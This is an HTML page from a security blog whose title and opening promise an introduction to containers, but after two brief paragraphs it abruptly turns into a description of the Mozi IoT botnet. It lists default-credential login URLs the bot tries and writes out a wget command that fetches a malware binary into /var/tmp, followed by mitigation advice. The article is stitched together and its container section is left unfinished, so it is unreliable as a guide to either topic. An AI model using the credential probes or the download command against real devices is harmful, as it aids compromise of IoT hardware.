@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="What are Containers?Containers are something like a virtual machine, it has its operating system and all, except that unlike virtual machines they don’t simulate the entire computer, but rather create">
+<meta property="og:type" content="article">
+<meta property="og:title" content="What is container technology and how can we use it?">
+<meta property="og:url" content="https://0x11e48b5.github.io/introduction-to-containers/index.html">
+<meta property="og:site_name" content="Cyber Security with R&amp;D perspective">
+<meta property="og:description" content="What are Containers?Containers are something like a virtual machine, it has its operating system and all, except that unlike virtual machines they don’t simulate the entire computer, but rather create">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0x11e48b5.github.io/introduction-to-containers/what-is-container-1.png">
+<meta property="article:published_time" content="2025-02-11T12:39:12.000Z">
+<meta property="article:modified_time" content="2025-02-11T08:51:31.919Z">
+<meta property="article:author" content="11E48B5">
+<meta property="article:tag" content="devops">
+<meta property="article:tag" content="docker">
+<meta property="article:tag" content="container">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0x11e48b5.github.io/introduction-to-containers/what-is-container-1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>What is container technology and how can we use it?</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/what-is-mozi-malware-and-how-it-works/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0x11e48b5.github.io/introduction-to-containers/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0x11e48b5.github.io/introduction-to-containers/&text=What is container technology and how can we use it?"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0x11e48b5.github.io/introduction-to-containers/&is_video=false&description=What is container technology and how can we use it?"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=What is container technology and how can we use it?&body=Check out this article: https://0x11e48b5.github.io/introduction-to-containers/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0x11e48b5.github.io/introduction-to-containers/&name=What is container technology and how can we use it?&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0x11e48b5.github.io/introduction-to-containers/&t=What is container technology and how can we use it?"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-Containers"><span class="toc-number">1.</span> <span class="toc-text">What are Containers?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-do-we-need-containers"><span class="toc-number">1.1.</span> <span class="toc-text">Why do we need containers?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-Mozi-Malware-Works-Technical-Details"><span class="toc-number">1.2.</span> <span class="toc-text">How Mozi Malware Works? (Technical Details)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technical-Mitigation-Strategies"><span class="toc-number">1.3.</span> <span class="toc-text">Technical Mitigation Strategies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention"><span class="toc-number">1.3.1.</span> <span class="toc-text">Prevention</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        What is container technology and how can we use it?
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">11E48B5</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-11T12:39:12.000Z" class="dt-published" itemprop="datePublished">2025-02-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/container/" rel="tag">container</a>, <a class="p-category" href="/tags/devops/" rel="tag">devops</a>, <a class="p-category" href="/tags/docker/" rel="tag">docker</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="What-are-Containers"><a href="#What-are-Containers" class="headerlink" title="What are Containers?"></a>What are Containers?</h1><p>Containers are something like a virtual machine, it has its operating system and all, except that unlike virtual machines <code>they don’t simulate the entire computer</code>, but rather create a sand boxed environment that pretends to be a virtual machine. Another defination for that; Containers provide a way of creating an isolated environment, sometimes called a sandbox, in which applications and their dependencies can live.</p>
+<img src="/introduction-to-containers/what-is-container-1.png" class="">
+
+<h2 id="Why-do-we-need-containers"><a href="#Why-do-we-need-containers" class="headerlink" title="Why do we need containers?"></a>Why do we need containers?</h2><p>Why do we need this technology? In order to answer that question, we should know the difference between VMs and Containers.</p>
+<h2 id="How-Mozi-Malware-Works-Technical-Details"><a href="#How-Mozi-Malware-Works-Technical-Details" class="headerlink" title="How Mozi Malware Works? (Technical Details)"></a>How Mozi Malware Works? (Technical Details)</h2><p>What if we download mozi malware from urlhaus or threatfox, you can see the type of this malwares mostly <code>ELF 32-bit MSB executable, MIPS, MIPS-I version 1</code> or <code>ARM</code> version of this. They gets downloaded from random node who already infected in botnet network. One infected Mozi bot (maybe router or camera) scans the network to find possible victims by sending HTTP requests to comman urls that used from possible IoT devices. Maybe it searchs for vulnerabilities that gives power to comprimise the device. Patterns for HTTP request that made from Mozi bot are that;</p>
+<ul>
+<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;user&amp;psd&#x3D;user</li>
+<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;admin&amp;psd&#x3D;admin</li>
+<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;adminisp&amp;psd&#x3D;adminisp</li>
+<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;ec8&amp;psd&#x3D;ec8</li>
+</ul>
+<p>If it can access possible victim using this credantials, it trys to download Mozi malware itself using <code>wget</code> command that is a powerful utility for non-interactive downloading of files from the web. The comman pattern to test victim is vulnerable for CMDi attacks for delivering malware is that <code>wget http://xxx.xx.xxx.xxx/bins/mozi.a -o /var/tmp/mozi.a; chmod 777 /var/tmp/mozi.a; rm -rf /var/tmp/mozi.a</code></p>
+<p>After that malware gets downloaded and executed. Once executed, the <code>binary forks</code> many versions of itself renamed as ‘ssh’ or ‘dropbear’. The forked processes are responsible for setting up the DHT communications and closing ports to prevent infection by other malware. The forked processes can also set up HTTP on a randomly chosen port to host the Mozi binary.</p>
+
+
+<h2 id="Technical-Mitigation-Strategies"><a href="#Technical-Mitigation-Strategies" class="headerlink" title="Technical Mitigation Strategies"></a>Technical Mitigation Strategies</h2><p>To effectively protect against <code>Mozi</code> malware, you can follow below advices. Here are detailed technical advices:</p>
+<h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h3><ul>
+<li>Strengthen Authentication:<ul>
+<li>Enforce strong, unique passwords for all IoT devices. Avoid using default credentials.</li>
+<li>Implement multi-factor authentication (MFA) where possible.</li>
+</ul>
+</li>
+<li>Firmware and Software Updates:<ul>
+<li>Regularly update firmware and software on all IoT devices to patch known vulnerabilities.</li>
+<li>Enable automatic updates if the option is available.</li>
+</ul>
+</li>
+<li>Network Segmentation:<ul>
+<li>Isolate IoT devices from critical network segments to limit the impact of a potential compromise.</li>
+<li>Use VLANs (Virtual Local Area Networks) and firewalls to control traffic between network segments.</li>
+</ul>
+</li>
+<li>Disable Unnecessary Services:<ul>
+<li>Turn off unused services and protocols on IoT devices to reduce attack surfaces.</li>
+</ul>
+</li>
+</ul>
+<p>See you in next blog.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-Containers"><span class="toc-number">1.</span> <span class="toc-text">What are Containers?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-do-we-need-containers"><span class="toc-number">1.1.</span> <span class="toc-text">Why do we need containers?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-Mozi-Malware-Works-Technical-Details"><span class="toc-number">1.2.</span> <span class="toc-text">How Mozi Malware Works? (Technical Details)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technical-Mitigation-Strategies"><span class="toc-number">1.3.</span> <span class="toc-text">Technical Mitigation Strategies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention"><span class="toc-number">1.3.1.</span> <span class="toc-text">Prevention</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0x11e48b5.github.io/introduction-to-containers/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0x11e48b5.github.io/introduction-to-containers/&text=What is container technology and how can we use it?"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0x11e48b5.github.io/introduction-to-containers/&is_video=false&description=What is container technology and how can we use it?"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=What is container technology and how can we use it?&body=Check out this article: https://0x11e48b5.github.io/introduction-to-containers/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0x11e48b5.github.io/introduction-to-containers/&title=What is container technology and how can we use it?"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0x11e48b5.github.io/introduction-to-containers/&name=What is container technology and how can we use it?&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0x11e48b5.github.io/introduction-to-containers/&t=What is container technology and how can we use it?"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    11E48B5
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
